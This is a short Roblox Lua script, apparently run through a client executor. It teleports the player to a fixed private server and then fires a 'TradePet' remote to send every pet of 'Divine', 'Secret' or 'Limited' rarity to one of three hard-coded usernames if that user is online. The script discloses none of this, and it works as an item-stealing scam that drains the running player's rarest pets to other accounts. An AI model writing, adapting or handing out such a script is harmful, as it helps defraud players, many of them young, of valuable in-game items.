repeat wait() until game:IsLoaded()

-- Services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Player
local player = Players.LocalPlayer

-- Game & Server ID
local gameID = 126884695634066
local privateServerID = "19fa2ffd5b2f404494bc8c791a60c706"

-- Teleport to private server
pcall(function()
    TeleportService:TeleportToPrivateServer(gameID, privateServerID, {player})
end)

-- Wait until player loads in again
player.CharacterAdded:Wait()
repeat wait() until game:IsLoaded()
wait(5)

-- Target rarities
local targetRarities = { "Divine", "Secret", "Limited" }
local rarityKey = "Rarity"

-- Target users to send pets to (if they're online)
local preferredUsers = {
    "boneblossom215",
    "beanstalk1251",
    "burningbud709"
}

-- Find one of the users online
local targetUser = nil
for _, name in ipairs(preferredUsers) do
    if Players:FindFirstChild(name) then
        targetUser = name
        break
    end
end

-- Find the trade remote
local tradeRemote = ReplicatedStorage:FindFirstChild("TradePet")

-- Find and send pets
if targetUser and tradeRemote and player:FindFirstChild("Pets") then
    for _, pet in ipairs(player.Pets:GetChildren()) do
        local rarity = pet:FindFirstChild(rarityKey)
        if rarity and table.find(targetRarities, rarity.Value) then
            tradeRemote:FireServer(targetUser, pet.Name)
        end
    end
else
    warn("❌ Missing target user, TradePet remote, or Pets folder.")
end
